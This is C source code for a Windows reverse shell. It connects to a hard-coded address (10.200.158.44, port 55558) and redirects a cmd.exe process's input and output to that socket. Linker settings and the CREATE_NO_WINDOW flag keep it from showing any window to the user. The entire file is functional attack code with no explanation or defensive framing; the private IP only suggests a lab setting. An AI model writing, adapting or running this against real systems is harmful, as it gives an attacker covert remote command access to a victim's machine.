#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
  
#pragma comment(lib, "Ws2_32.lib") //Inform the linker that the Ws2_32.lib file is needed.
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")  

#define DEFAULT_PORT 55558
#define DEFAULT_IP "10.200.158.44"
  
WSADATA wsaData;
SOCKET Winsocket;
STARTUPINFO theProcess; 
PROCESS_INFORMATION info_proc; 
struct sockaddr_in Winsocket_Structure;

int main(int argc, char *argv[])
{
	char *IP =  DEFAULT_IP;
	short port = DEFAULT_PORT;
	
	WSAStartup(MAKEWORD(2,2), &wsaData);
	Winsocket=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL, (unsigned int) NULL, (unsigned int) NULL);
	Winsocket_Structure.sin_port=htons(port);
	Winsocket_Structure.sin_family=AF_INET;
	Winsocket_Structure.sin_addr.s_addr=inet_addr(IP);
	
	if(Winsocket==INVALID_SOCKET){
		WSACleanup();
		return 1;
	}
	
	if(WSAConnect(Winsocket,(SOCKADDR*)&Winsocket_Structure,sizeof(Winsocket_Structure),NULL,NULL,NULL,NULL) == SOCKET_ERROR){
		WSACleanup();
		return 1;
	}
	
	// Starting shell by creating a new process with i/o redirection.    
	memset(&theProcess,0,sizeof(theProcess));
	theProcess.cb=sizeof(theProcess);
	theProcess.dwFlags=STARTF_USESTDHANDLES;
	
	// here we make the redirection
	theProcess.hStdInput = theProcess.hStdOutput = theProcess.hStdError = (HANDLE)Winsocket;
	
	// fork the new process.
	if(CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&theProcess,&info_proc)==0){
		WSACleanup();
		return 1;
	}
	
	return 0;    
}
